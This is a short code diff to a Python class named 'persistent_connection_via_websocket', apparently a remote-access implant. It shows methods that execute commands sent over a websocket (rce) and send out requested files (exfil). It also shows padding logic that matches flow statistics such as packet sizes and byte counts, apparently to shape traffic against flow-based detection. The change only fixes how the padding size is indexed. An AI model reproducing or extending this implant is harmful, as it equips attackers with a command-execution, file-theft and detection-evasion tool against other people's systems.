@@ -31,7 +31,7 @@ class persistent_connection_via_websocket():
         self.server = server
         self.server_port = server_port
     def generate_random_string(self,size:int):
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=int(size[0])))
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=int(size)))
     async def rce(self, websocket, command):
         """Executes a command and returns the output."""
         try:
@@ -73,8 +73,9 @@ class persistent_connection_via_websocket():
 
                     await self.exfil(websocket=websocket, file_path=f"{list(command_data.values())[0]}")
                 elif "src2dst_max_ps" in list(command_data.keys())[0] and command_data["src2dst_max_ps"] != None:
-                    pad= self.generate_random_string(command_data["src2dst_max_ps"])
+                    pad= self.generate_random_string(command_data["src2dst_max_ps"][0])
                     await websocket.send(pad)
+                    
                 elif "dst2src_max_ps" in list(command_data.keys())[0] and command_data["dst2src_max_ps"] != None:
                     await websocket.recv()
                 elif "src2dst_packets" in list(command_data.keys())[0] and command_data["src2dst_packets"] != None:
@@ -85,7 +86,7 @@ class persistent_connection_via_websocket():
                 elif "dst2src_bytes" in list(command_data.keys())[0] and command_data["dst2src_bytes"] != None:
                     await websocket.recv()               
                 elif "src2dst_bytes" in list(command_data.keys())[0] and command_data["src2dst_bytes"] != None:
-                    pad= self.generate_random_string(command_data["src2dst_bytes"])
+                    pad= self.generate_random_string(command_data["src2dst_bytes"][0])
                     await websocket.send(pad)
                 elif "dst2src_packets" in list(command_data.keys())[0] and command_data["dst2src_packets"] != None:
 
